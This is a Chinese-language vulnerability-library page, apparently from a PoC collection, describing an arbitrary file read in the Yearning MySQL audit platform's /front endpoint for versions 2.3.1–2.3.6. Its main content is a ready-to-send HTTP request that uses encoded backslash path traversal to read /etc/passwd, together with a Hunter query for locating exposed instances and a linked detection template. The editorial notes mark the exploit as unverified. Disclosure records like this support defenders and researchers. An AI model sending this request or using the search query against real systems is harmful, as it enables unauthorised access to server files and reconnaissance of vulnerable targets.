---
source: "wy876 漏洞文库"
title: "Yearning front 接口存在任意文件读取漏洞"
product: "Yearning"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "2.3.1/2.3.2/2.3.4-2.3.6 inprose;auth/platform routing unknown"
hunter: "app.name==\"Yearning\""
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-8b0cdeef1ad51eb6c6214257"
entity_id: "ve-8b0cdeef1ad51eb6c6214257"
schema_version: "1"
---

# Yearning front 接口存在任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：2.3.1/2.3.2/2.3.4-2.3.6 inprose;auth/platform routing unknown
- 证据范围：Encodedbackslash traversal toUnixpath;noresponse;platformbehaviorunverified

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
- 将误放入 FOFA 的 Hunter 查询按正文原式保存到 hunter 字段，不改写查询语义。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- fofa metadata truncatedHunter app.name==
- Impactsection dropsspecificversionspresentinintro
- HTTP/2 textincludesConnectionclose;normalizeprotocol representation
- No primaryadvisory/fix orverificationofbackslashhandling;Javablockmislabel

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
Yearning是中国Henry Yee个人开发者的一个出色方便快捷的 Mysql SQL 审核平台。Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本 和 Neptune 2.3.4 - 2.3.6 版本存在安全漏洞，该漏洞源于存在一个任意文件读取漏洞。攻击者可以利用该漏洞获取敏感信息。

# 二、影响版本
+ Yearning

# 三、资产测绘
+ hunter`app.name=="Yearning"`
+ 特征


# 四、漏洞复现
```http
GET /front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

[yearning-front-readfile.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222142312-c41a9525-b4d6-40ae-8332-da2f36609f9e.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvbgbkdvgfwckrxo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
